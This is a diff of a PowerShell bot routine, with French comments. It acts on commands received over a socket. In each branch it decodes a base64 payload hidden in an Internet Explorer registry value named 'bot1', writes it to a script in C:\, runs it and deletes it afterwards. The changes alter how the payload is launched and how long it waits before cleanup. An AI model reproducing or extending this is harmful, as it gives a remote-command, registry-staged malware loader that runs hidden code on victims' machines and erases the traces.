@@ -9,9 +9,9 @@ function global:FRX_Socket-MessageAction{
             $message = $option
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
             $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File C:\update.ps1 
-            start powershell.exe ./update.ps1 
+            start c:\update.ps1 
             Start-Sleep -s 15
-            rm c:\update.ps1  # envoyer en paramètre la fonction.
+            rm c:\update.ps1  
 
             }
         {$_ -match "recupscript"       }{
@@ -19,8 +19,8 @@ function global:FRX_Socket-MessageAction{
             $message = $option
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
             $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File c:\recup.ps1
-            start powershell.exe ./recup.ps1
-            Start-Sleep -s 15
+            start c:\recup.ps1
+            Start-Sleep -s 60
             rm C:\recup.ps1  # envoyer en paramètre la fonction.        
             
             
@@ -30,10 +30,9 @@ function global:FRX_Socket-MessageAction{
             $message = $option
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
             $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File c:\tache.ps1
-            start powershell.exe ./tache.ps1 $option
+            start C:\tache.ps1 
             Start-Sleep -s 60
-            rm c:\tache.ps1 # envoyer en paramètre la fonction.
-            
+            rm c:\tache.ps1 
             }
         Default {write-host $message}
     }
